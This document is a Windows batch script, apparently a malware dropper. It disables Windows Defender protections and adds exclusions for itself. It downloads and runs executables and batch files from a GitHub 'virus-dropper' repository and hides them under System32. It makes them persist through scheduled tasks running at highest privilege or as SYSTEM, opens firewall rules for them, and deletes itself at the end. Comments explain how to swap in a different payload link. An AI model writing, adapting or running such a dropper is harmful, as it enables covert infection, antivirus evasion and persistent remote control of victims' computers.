color ef
cls
::disables ControlledFolderAccess to access files and folders
cls
powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
cls
curl "https://raw.githubusercontent.com/034nop/virus-dropper/main/install/AV.bat" --output "AV.bat"
cls
start /min AV.bat
cls
curl "https://raw.githubusercontent.com/034nop/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
cls
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
cls
::windows defender exclusions
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows2.exe'"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"funky.exe'"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"runas.bat'"
cls
md "%systemroot%\System32\Windowsexe"
cls

::upload files here: github.com - create account and create repository (public) then upload files
::put payload file DIRECT download link here:
curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows.exe" --output "%appdata%\Windows.exe"
curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows2.exe" --output "%appdata%\Windows2.exe"
curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/funky.exe" --output "%appdata%\funky.exe"
curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/runas.bat" --output "%appdata%\runas.bat"
::do not change the --output, unless the payload is not a .exe file. (in that case, change all mentions of Windows.exe to Windows.extension)
cls


move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
move "%appdata%\Windows2.exe" "%systemroot%\System32\Windowsexe"
move "%appdata%\funky.exe" "%systemroot%\System32\Windowsexe"
move "%appdata%\runas.bat" "%systemroot%\System32\Windowsexe"
cls



powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
cls
NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
cls
start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
cls
move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
cls
start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
cls
SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST
SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL HIGHEST
SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL HIGHEST
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
cls
netsh advfirewall firewall add rule name="Windows Manager" dir=in action=allow program="%systemroot%\System32\Windowsexe\Windows.exe" enable=yes
netsh advfirewall firewall add rule name="Windows Manager 2" dir=in action=allow program="%systemroot%\System32\Windowsexe\Windows2.exe" enable=yes
netsh advfirewall firewall add rule name="Client Manager" dir=in action=allow program="%systemroot%\System32\Windowsexe\funky.exe" enable=yes
netsh advfirewall firewall add rule name="Client Manager" dir=in action=allow program="%systemroot%\System32\Windowsexe\runas.bat" enable=yes
cls
del /f NSudo.exe
cls
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
